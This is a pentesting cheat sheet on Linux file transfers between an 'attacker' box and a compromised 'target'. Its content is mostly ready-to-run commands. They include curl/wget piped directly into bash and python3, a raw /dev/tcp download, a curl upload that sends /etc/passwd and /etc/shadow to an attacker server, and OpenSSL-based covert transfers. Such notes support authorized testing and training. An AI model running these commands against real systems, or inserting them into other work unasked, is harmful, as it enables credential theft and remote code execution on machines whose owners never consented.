# Linux File Transfers

## wget

```bash
wget https://example.com/LinEnum.sh -O /tmp/LinEnum.sh
```

## curl

```bash
curl -o /tmp/LinEnum.sh https://example.com/LinEnum.sh
```

## Fileless (Pipe to Interpreter)

```bash
curl https://example.com/LinEnum.sh | bash
wget -qO- https://example.com/script.py | python3
```

---

## Bash /dev/tcp (No curl/wget)

Requires Bash 2.04+ compiled with `--enable-net-redirections`.

```bash
exec 3<>/dev/tcp/10.10.10.32/80
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
cat <&3
```

---

## Base64 (No Network)

On attacker:

```bash
cat filetoupload | base64 -w 0; echo
```

On target:

```bash
echo '<base64 string>' | base64 -d > filetoupload
```

---

## Uploads — curl to Python uploadserver

```bash
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

## Uploads — Web Server on Compromised Host

Start a web server on the target and download from your attacker box:

```bash
python3 -m http.server 8000   # on target
wget 192.168.49.128:8000/filetotransfer.txt   # on attacker
```

---

## SCP (SSH)

```bash
# Enable SSH on attacker
sudo systemctl enable ssh && sudo systemctl start ssh

# Download from remote to local
scp user@10.10.10.32:/root/file.txt .

# Upload from local to remote
scp /home/kali/linpeas.sh user@10.10.10.100:/tmp

# From target, pull from attacker
scp kali@172.16.6.1:/home/kali/Documents/linpeas.sh .
```

---

## OpenSSL Encrypted Transfer

```bash
# Attacker — generate cert and serve file
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh

# Target — download file
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

## OpenSSL File Encryption

```bash
# Encrypt
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc

# Decrypt
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```

Use a strong unique password per engagement.
